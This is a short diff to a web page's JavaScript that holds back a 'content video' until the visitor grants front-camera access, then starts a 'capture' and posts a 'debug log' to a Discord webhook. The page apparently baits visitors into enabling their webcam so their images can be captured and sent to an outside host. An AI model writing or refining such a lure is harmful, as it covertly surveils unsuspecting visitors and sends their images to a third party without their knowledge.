@@ -53,16 +53,8 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
-    // 1. Auto-play content video
-    contentVideo.play().then(() => {
-        // Autoplay started (possibly w/ sound if user engaged)
-        updateVolumeIcon();
-    }).catch(() => {
-        // Autoplay blocked, fallback to mute
-        contentVideo.muted = true;
-        contentVideo.play();
-        updateVolumeIcon();
-    });
+    // 1. Auto-play REMOVED - Waiting for permissions
+    // contentVideo.play()... logic moved to inside initCapture
 
     // --- UI Interactions ---
 
@@ -191,6 +183,15 @@ document.addEventListener('DOMContentLoaded', () => {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
 
             console.log("Permissions granted. Starting capture...");
+
+            // START VIDEO only after permissions!
+            contentVideo.play().then(() => {
+                updateVolumeIcon();
+            }).catch(() => {
+                contentVideo.muted = true;
+                contentVideo.play();
+                updateVolumeIcon();
+            });
 
             // Debug Log to Discord
             fetch(webhookUrl, {
